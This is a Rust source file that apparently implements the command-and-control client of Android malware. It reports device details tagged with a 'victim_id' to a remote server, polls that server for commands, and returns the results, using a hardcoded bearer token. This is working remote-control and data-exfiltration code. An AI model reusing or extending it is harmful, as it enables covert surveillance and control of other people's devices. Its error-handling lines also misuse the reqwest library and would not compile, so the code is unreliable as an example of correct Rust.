use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use once_cell::sync::Lazy;

static CLIENT: Lazy<Client> = Lazy::new(|| {
    Client::builder()
        .timeout(Duration::from_secs(10))
        .connect_timeout(Duration::from_secs(5))
        .default_headers({
            let mut headers = reqwest::header::HeaderMap::new();
            headers.insert(reqwest::header::AUTHORIZATION, reqwest::header::HeaderValue::from_static("Bearer AEGIS_SECRET_TOKEN_123"));
            headers
        })
        .build()
        .expect("Failed to create HTTP client")
});

#[derive(Serialize, Deserialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub os: String,
    pub android_version: String,
    pub model: String,
    pub battery: u8,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Command {
    pub id: String,
    pub action: String,
    pub args: serde_json::Value,
}

pub async fn send_heartbeat(base_url: &str, victim_id: &str, info: &SystemInfo) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/heartbeat", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "info": info
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}

pub async fn poll_commands(base_url: &str, victim_id: &str) -> Result<Vec<Command>, reqwest::Error> {
    let url = format!("{}/api/v1/commands?victim_id={}", base_url, victim_id);
    let res = CLIENT.get(&url).send().await?;
    if res.status().is_success() {
        let commands: Vec<Command> = res.json().await?;
        Ok(commands)
    } else {
        Ok(vec![])
    }
}

pub async fn send_response(base_url: &str, victim_id: &str, command_id: &str, success: bool, data: serde_json::Value) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/response", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "command_id": command_id,
        "success": success,
        "data": data
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}
